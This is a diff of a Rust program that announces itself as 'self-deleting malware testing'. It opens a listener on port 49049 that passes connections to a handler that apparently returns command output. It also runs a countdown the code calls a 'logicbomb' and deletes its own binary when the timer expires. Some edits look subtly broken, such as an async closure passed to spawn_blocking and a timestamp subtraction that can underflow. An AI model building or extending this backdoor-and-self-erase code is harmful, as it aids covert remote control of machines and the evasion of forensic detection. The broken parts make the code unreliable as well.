@@ -1,9 +1,11 @@
+use chrono;
 use std::{
     error::Error,
     fs,
     path::{self, PathBuf},
     process, thread, time,
 };
+use tokio::sync::mpsc;
 mod operations;
 
 fn delete(abs_path: &PathBuf) -> Result<(), Box<dyn Error>> {
@@ -12,7 +14,7 @@ fn delete(abs_path: &PathBuf) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
-fn get_malware_path() -> Result<path::PathBuf, Box<dyn Error>> {
+fn get_malware_path() -> Result<PathBuf, Box<dyn Error>> {
     /*In Linux, we can get the path of a binary
      * from /proc/PID/exe, which is a symlink to
      * the binary.
@@ -22,18 +24,18 @@ fn get_malware_path() -> Result<path::PathBuf, Box<dyn Error>> {
     let pid = process::id();
     let formatted = format!("/proc/{pid}/exe");
 
-    let path = fs::read_link(path::PathBuf::from(formatted))?;
+    let mut path = fs::read_link(path::PathBuf::from(formatted))?;
     match fs::exists(&path) {
-        Ok(_v) => eprintln!("binary found @ {}", &path.to_string_lossy()),
+        Ok(_v) => eprintln!("binary found @ {}", path.to_string_lossy()),
         Err(_e) => {
             eprintln!("failed to get legitimate binary path.");
-            let _ = get_malware_path();
+            path = get_malware_path()?;
         }
     }
     Ok(path)
 }
 
-fn timer(count: u64, max_count: u64) -> bool {
+fn timer(count: usize, max_count: usize) -> bool {
     /* Sleeps for `x` seconds.
      * In later versions, replace this with just a sleep timer
      * using chrono and then use the timestamp from the unix timestamp
@@ -48,16 +50,20 @@ fn timer(count: u64, max_count: u64) -> bool {
     logicbomb
 }
 
+const TIMER: usize = 30;
+
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn Error>> {
     /* Main Function */
     eprintln!("Started self-deleting malware testing.");
+
+    // start
+    let time_now = chrono::Local::now().timestamp();
+    let mut until = time_now as usize + TIMER;
+
     let mut bin_path: path::PathBuf = match get_malware_path() {
         Ok(v) => v,
-        Err(e) => {
-            eprintln!("can't get path to binary: {e}");
-            PathBuf::from("")
-        }
+        Err(e) => PathBuf::from(""),
     };
 
     let pid = process::id();
@@ -65,30 +71,36 @@ async fn main() -> Result<(), Box<dyn Error>> {
     eprintln!("tcp server started at 49049");
     tokio::task::spawn(async move {
         loop {
+            let mut time = 0;
             let (socket, _) = match listener.accept().await {
-                Ok((v, e)) => (v, e),
+                Ok((v, e)) => {
+                    time = chrono::Local::now().timestamp();
+                    (v, e)
+                }
                 Err(_) => {
                     eprintln!("exiting");
                     std::process::exit(1)
                 }
             };
-            match operations::onstart::init(socket).await {
+            let time_left = until - time as usize;
+            match operations::onstart::init(socket, time_left).await {
                 Ok(command_out) => {
                     println!("{:?}", command_out)
                 }
                 Err(_) => eprintln!("disconnected"),
-            }
+            };
         }
     });
 
     // thread to continue counting.
-    let timer = tokio::task::spawn_blocking(move || {
+    let timer = tokio::task::spawn_blocking(async move || {
         dbg!(&bin_path, pid);
 
-        let mut counter: u64 = 0;
+        let mut counter: usize = time_now as usize;
+        // set the timer here:
         loop {
             bin_path = get_malware_path().expect("something went wrong within the thread");
-            if timer(counter, 30) {
+            if timer(counter, until) {
                 match delete(&bin_path) {
                     Ok(()) => (),
                     Err(e) => eprintln!("{e}"),
@@ -101,6 +113,6 @@ async fn main() -> Result<(), Box<dyn Error>> {
         }
     });
 
-    tokio::join!(timer).0.unwrap();
+    tokio::join!(timer).0.unwrap().await;
     Ok(())
 }
